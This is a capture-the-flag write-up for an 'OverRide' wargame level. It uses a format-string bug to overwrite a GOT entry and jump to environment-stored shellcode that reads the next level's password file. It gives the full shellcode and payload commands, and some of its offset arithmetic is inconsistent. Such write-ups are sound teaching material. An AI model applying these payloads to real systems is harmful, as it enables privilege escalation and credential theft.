# Level05

## Reconnaissance

We have no security enabled.

```shell
level05@OverRide:~$ ltrace ./level05 
__libc_start_main(0x8048444, 1, -10540, 0x8048520, 0x8048590 <unfinished ...>
fgets(AAAA
"AAAA\n", 100, 0xf7fcfac0)                                             = 0xffffd5c8
printf("aaaa\n"aaaa
)                                                             = 5
exit(0 <unfinished ...>
+++ exited (status 0) +++
```

We have a format string vulnerability and the binary is dynamically linked so we can probably overwrite the GOT table for a shell code.
After analyse of the binary, we notice that the string we pass to `fgets` is modified from Uppercase to Lowercase.

## Exploit

Get the address to overwrite in the GOT table.
Lets overwrite exit: `objdump -R level05` => `0x080497e0`

We get the position:
```shell
level05@OverRide:~$ ./level05 
aaaa %10$x
aaaa 61616161
```
Lets put our shell code in the env:
We put the shellcode in the env (`0xffffd7ad`): `export SHELLCODE=$(python -c 'print 100 * "\x90" + "\x31\xc0\x50\x68\x70\x61\x73\x73\x68\x30\x36\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x31\xc9\x31\xd2\x89\xe3\x6a\x05\x58\xcd\x80\x83\xec\x29\x89\xc3\x89\xe1\x6a\x29\x5a\x6a\x03\x58\xcd\x80\x6a\x01\x5b\x6a\x04\x58\xcd\x80"')`

`0xffffd7ad` = `4294956973`

Payload => `python -c 'print "\xe0\x97\x04\x08" + "%4294956999d" + "%10$n"'`

Not working because string too long for printf to be printed.
Lets try to modify the address in two times. We gonna use `%hn` which do like `%n` but only for the first two bytes

`0xffffd7ad` + `48` (to arrive in NOP) = `0xffffd7dd`:
- `0xd7ad` => `55261` + `8` (two addresses printed before) = `55253`
- `0xffff` => `65535` - `55261` = `10274`

Payload => `python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55253d" + "%10$hn" + "%10274d" + "%11$hn"'`